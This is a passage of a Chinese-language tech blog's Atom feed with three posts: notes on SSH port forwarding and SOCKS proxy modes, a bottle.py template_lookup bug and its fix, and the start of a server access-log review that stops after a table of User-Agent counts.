<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Tech Rain - 02</title><link href="https://blog.inndy.tw/" rel="alternate"></link><link href="https://blog.inndy.tw/feeds/02.atom.xml" rel="self"></link><id>https://blog.inndy.tw/</id><updated>2016-02-26T08:14:00+08:00</updated><entry><title>SSH tunnel 筆記</title><link href="https://blog.inndy.tw/2016/02/26/ssh-tunnel-note/" rel="alternate"></link><published>2016-02-26T08:14:00+08:00</published><updated>2016-02-26T08:14:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2016-02-26:/2016/02/26/ssh-tunnel-note/</id><summary type="html">&lt;p&gt;SSH Tunnel 有&lt;strong&gt;三種&lt;/strong&gt;工作模式，使用 ssh tunnnel 的好處有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在可能被監聽的網路環境保護未加密連線的安全&lt;/li&gt;
&lt;li&gt;翻牆&lt;/li&gt;
&lt;li&gt;一定程度上取代 VPN，是一個比較 light-weight 的解決方案&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;先定義兩個名詞：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;local: ssh client&lt;/li&gt;
&lt;li&gt;remote: ssh server&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;在 local listen port A，透過 remote forward 到 host B 的 port C&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ssh user@host -L [local_bind_address:]local_port_A:host_B:remote_port_C&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh user@host -L …&lt;/code&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;SSH Tunnel 有&lt;strong&gt;三種&lt;/strong&gt;工作模式，使用 ssh tunnnel 的好處有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在可能被監聽的網路環境保護未加密連線的安全&lt;/li&gt;
&lt;li&gt;翻牆&lt;/li&gt;
&lt;li&gt;一定程度上取代 VPN，是一個比較 light-weight 的解決方案&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;先定義兩個名詞：&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;local: ssh client&lt;/li&gt;
&lt;li&gt;remote: ssh server&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;在 local listen port A，透過 remote forward 到 host B 的 port C&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ssh user@host -L [local_bind_address:]local_port_A:host_B:remote_port_C&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh user@host -L 8080:10.7.99.8:80&lt;/code&gt; -- 在 local 聽 8080 port，透過 remote 再連到 &lt;code&gt;10.7.99.8:80&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;在 remote listen port A，透過 local forward 到 host B 的 port C&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ssh user@host -R [remote_bind_address:]local_port_A:host_B:remote_port_C&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh user@host -R 2223:140.112.172.1:23&lt;/code&gt; -- 在 remote 聽 2223 port，透過 local 再連到 telnet protocol 的 ptt&lt;/p&gt;
&lt;h3&gt;在 local listen port P，建立 socks proxy server&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;ssh user@host -D [local_bind_address:]local_port_P&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;example:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh user@host -D 7788&lt;/code&gt; -- 在 local 聽 7788 port，會是一個 socks proxy service，連線會透過 remote 再連到目標&lt;/p&gt;</content></entry><entry><title>花了兩個小時幫 bottle.py 修了一個 bug</title><link href="https://blog.inndy.tw/2016/02/06/spent-two-hours-to-fix-a-bug-in-bottlepy/" rel="alternate"></link><published>2016-02-06T10:30:00+08:00</published><updated>2016-02-06T10:30:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2016-02-06:/2016/02/06/spent-two-hours-to-fix-a-bug-in-bottlepy/</id><summary type="html">&lt;p&gt;真的很賭爛因為別人的 code 有 bug 讓自己花了超久的時間 debug&lt;/p&gt;
&lt;p&gt;最近在寫一個 CTF 訓練平台，架構上採用 peewee + bottle.py 進行開發，因為不想花太多時間去學 Django 這種太龐大的架構（加上有些用法自己不見得喜歡），所以打算自幹整個架構&lt;/p&gt;
&lt;p&gt;遇到了一個問題是我需要自訂 view 的路徑，翻了一下 code 之後發現我有 &lt;code&gt;template_lookup&lt;/code&gt; 這個 keyword argument 可以用，但是不管怎麼嘗試，就是沒辦法讓 bottle.py 去我指定的 path 找 template file，不知道是不是我對 decorator 有誤解，改了老半天，後來又 trace 了一下 bottle.py 的 code …&lt;/p&gt;</summary><content type="html">&lt;p&gt;真的很賭爛因為別人的 code 有 bug 讓自己花了超久的時間 debug&lt;/p&gt;
&lt;p&gt;最近在寫一個 CTF 訓練平台，架構上採用 peewee + bottle.py 進行開發，因為不想花太多時間去學 Django 這種太龐大的架構（加上有些用法自己不見得喜歡），所以打算自幹整個架構&lt;/p&gt;
&lt;p&gt;遇到了一個問題是我需要自訂 view 的路徑，翻了一下 code 之後發現我有 &lt;code&gt;template_lookup&lt;/code&gt; 這個 keyword argument 可以用，但是不管怎麼嘗試，就是沒辦法讓 bottle.py 去我指定的 path 找 template file，不知道是不是我對 decorator 有誤解，改了老半天，後來又 trace 了一下 bottle.py 的 code，才發現根本不是我的問題.....&lt;/p&gt;
&lt;h2&gt;TL;DR&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="sd"&gt;    Get a rendered template as a string iterator.&lt;/span&gt;
&lt;span class="sd"&gt;    You can use a name, a filename or a template string as first parameter.&lt;/span&gt;
&lt;span class="sd"&gt;    Template rendering arguments can be passed as dictionaries&lt;/span&gt;
&lt;span class="sd"&gt;    or directly (as keyword arguments).&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
    &lt;span class="n"&gt;tpl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
    &lt;span class="c1"&gt;# should mixin args into kwargs here&lt;/span&gt;
    &lt;span class="n"&gt;adapter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;template_adapter&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;SimpleTemplate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;lookup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;template_lookup&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;TEMPLATE_PATH&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# &amp;lt;-- template_lookup reads from here&lt;/span&gt;
    &lt;span class="n"&gt;tplid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;id&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;tpl&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;tplid&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;TEMPLATES&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="n"&gt;DEBUG&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;settings&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;template_settings&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tpl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;adapter&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;TEMPLATES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;tplid&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;tpl&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;TEMPLATES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;tplid&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;prepare&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tpl&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;{&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tpl&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;%&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tpl&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;$&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;tpl&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;TEMPLATES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;tplid&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;adapter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;source&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;tpl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;TEMPLATES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;tplid&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;adapter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;tpl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;settings&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;TEMPLATES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;tplid&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt;
        &lt;span class="n"&gt;abort&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Template (&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;) not found&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;tpl&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;dictarg&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]:&lt;/span&gt;
        &lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;dictarg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# &amp;lt;-- my template_lookup appears here&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;TEMPLATES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;tplid&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;render&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="n"&gt;mako_template&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;functools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;partial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;template_adapter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;MakoTemplate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;cheetah_template&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;functools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;partial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                                     &lt;span class="n"&gt;template_adapter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;CheetahTemplate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;jinja2_template&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;functools&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;partial&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;template_adapter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;Jinja2Template&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;view&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tpl_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;defaults&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot; Decorator: renders a template for a handler.&lt;/span&gt;
&lt;span class="sd"&gt;        The handler can control its behavior like that:&lt;/span&gt;

&lt;span class="sd"&gt;          - return a dict of template vars to fill out the template&lt;/span&gt;
&lt;span class="sd"&gt;          - return something other than a dict and the view decorator will not&lt;/span&gt;
&lt;span class="sd"&gt;            process the template, but return the handler result as is.&lt;/span&gt;
&lt;span class="sd"&gt;            This includes returning a HTTPResponse(dict) to get,&lt;/span&gt;
&lt;span class="sd"&gt;            for instance, JSON with autojson or other castfilters.&lt;/span&gt;
&lt;span class="sd"&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decorator&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

        &lt;span class="nd"&gt;@functools.wraps&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wrapper&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;func&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;isinstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;DictMixin&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
                &lt;span class="n"&gt;tplvars&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;defaults&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;copy&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
                &lt;span class="n"&gt;tplvars&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tpl_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;tplvars&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="ow"&gt;is&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tpl_name&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;defaults&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;# &amp;lt;-- if goes here&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;wrapper&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;decorator&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a href="https://github.com/Inndy/bottle/commit/ba5b4da8afdb09e1d9490e43dbec95002fb4f7fb"&gt;Patch at here&lt;/a&gt; and &lt;a href="https://github.com/bottlepy/bottle/pull/830"&gt;PR at here&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>網管的田野調查之誰在踹我的Server</title><link href="https://blog.inndy.tw/2015/02/20/who-are-trying-my-server/" rel="alternate"></link><published>2015-02-20T11:33:00+08:00</published><updated>2015-02-20T11:33:00+08:00</updated><author><name>Inndy</name></author><id>tag:blog.inndy.tw,2015-02-20:/2015/02/20/who-are-trying-my-server/</id><summary type="html">&lt;p&gt;身為一個網管，平常的好（ㄜˋ）習（ㄑㄩˋ）慣（ㄨㄟˋ）之一就是看Log
定期看看你的 server 最近又被誰踹了、有哪些攻擊的痕跡、有誰跟你 Say Hello (?&lt;/p&gt;
&lt;h1&gt;HTTP Access Log&lt;/h1&gt;
&lt;h2&gt;User-Agent&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ log-cat.py &lt;span class="s2"&gt;&amp;quot;{8}&amp;quot;&lt;/span&gt; school-access.log &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -c &lt;span class="p"&gt;|&lt;/span&gt; sort -nr &lt;span class="p"&gt;|&lt;/span&gt; head -n &lt;span class="m"&gt;16&lt;/span&gt;
  &lt;span class="m"&gt;56428&lt;/span&gt; -
   &lt;span class="m"&gt;2716&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;X11&lt;span class="p"&gt;;&lt;/span&gt; U&lt;span class="p"&gt;;&lt;/span&gt; Linux i686&lt;span class="p"&gt;;&lt;/span&gt; pt-BR&lt;span class="p"&gt;;&lt;/span&gt; rv:1.9.0.15&lt;span class="o"&gt;)&lt;/span&gt; Gecko/2009102815 Ubuntu …&lt;/pre&gt;&lt;/div&gt;</summary><content type="html">&lt;p&gt;身為一個網管，平常的好（ㄜˋ）習（ㄑㄩˋ）慣（ㄨㄟˋ）之一就是看Log
定期看看你的 server 最近又被誰踹了、有哪些攻擊的痕跡、有誰跟你 Say Hello (?&lt;/p&gt;
&lt;h1&gt;HTTP Access Log&lt;/h1&gt;
&lt;h2&gt;User-Agent&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ log-cat.py &lt;span class="s2"&gt;&amp;quot;{8}&amp;quot;&lt;/span&gt; school-access.log &lt;span class="p"&gt;|&lt;/span&gt; sort &lt;span class="p"&gt;|&lt;/span&gt; uniq -c &lt;span class="p"&gt;|&lt;/span&gt; sort -nr &lt;span class="p"&gt;|&lt;/span&gt; head -n &lt;span class="m"&gt;16&lt;/span&gt;
  &lt;span class="m"&gt;56428&lt;/span&gt; -
   &lt;span class="m"&gt;2716&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;X11&lt;span class="p"&gt;;&lt;/span&gt; U&lt;span class="p"&gt;;&lt;/span&gt; Linux i686&lt;span class="p"&gt;;&lt;/span&gt; pt-BR&lt;span class="p"&gt;;&lt;/span&gt; rv:1.9.0.15&lt;span class="o"&gt;)&lt;/span&gt; Gecko/2009102815 Ubuntu/9.04 &lt;span class="o"&gt;(&lt;/span&gt;jaunty&lt;span class="o"&gt;)&lt;/span&gt; Firefox/3.0.15
   &lt;span class="m"&gt;2569&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Windows NT &lt;span class="m"&gt;6&lt;/span&gt;.3&lt;span class="p"&gt;;&lt;/span&gt; WOW64&lt;span class="o"&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class="o"&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class="o"&gt;)&lt;/span&gt; Chrome/40.0.2214.111 Safari/537.36
   &lt;span class="m"&gt;2206&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Windows NT &lt;span class="m"&gt;6&lt;/span&gt;.1&lt;span class="o"&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class="o"&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class="o"&gt;)&lt;/span&gt; Chrome/40.0.2214.91 Safari/537.36
   &lt;span class="m"&gt;2175&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;X11&lt;span class="p"&gt;;&lt;/span&gt; Ubuntu&lt;span class="p"&gt;;&lt;/span&gt; Linux i686&lt;span class="p"&gt;;&lt;/span&gt; rv:37.0&lt;span class="o"&gt;)&lt;/span&gt; Gecko/20100101 Firefox/37.0
   &lt;span class="m"&gt;1444&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Windows&lt;span class="p"&gt;;&lt;/span&gt; U&lt;span class="p"&gt;;&lt;/span&gt; Windows NT &lt;span class="m"&gt;5&lt;/span&gt;.1&lt;span class="p"&gt;;&lt;/span&gt; en-US&lt;span class="p"&gt;;&lt;/span&gt; rv:1.9.0.7&lt;span class="o"&gt;)&lt;/span&gt; Gecko/2009021910 Firefox/3.0.7
   &lt;span class="m"&gt;1031&lt;/span&gt; Apache/2.4.7 &lt;span class="o"&gt;(&lt;/span&gt;Ubuntu&lt;span class="o"&gt;)&lt;/span&gt; PHP/5.5.9-1ubuntu4.5 &lt;span class="o"&gt;(&lt;/span&gt;internal dummy connection&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;895&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;compatible&lt;span class="p"&gt;;&lt;/span&gt; Googlebot/2.1&lt;span class="p"&gt;;&lt;/span&gt; +http://www.google.com/bot.html&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="m"&gt;698&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;Macintosh&lt;span class="p"&gt;;&lt;/span&gt; Intel Mac OS X &lt;span class="m"&gt;10&lt;/span&gt;.10&lt;span class="p"&gt;;&lt;/span&gt; rv:34.0&lt;span class="o"&gt;)&lt;/span&gt; Gecko/20100101 Firefox/34.0
    &lt;span class="m"&gt;590&lt;/span&gt; Mozilla/5.0 &lt;span class="o"&gt;(&lt;/span&gt;compatible&lt;span class="p"&gt;;&lt;/span&gt; Baiduspider/2.0&lt;span class="p"&gt;;&lt;/span&gt; +http://www.baidu.com/search/spider.html&lt;span class="o"&gt;)&lt;/span&gt;
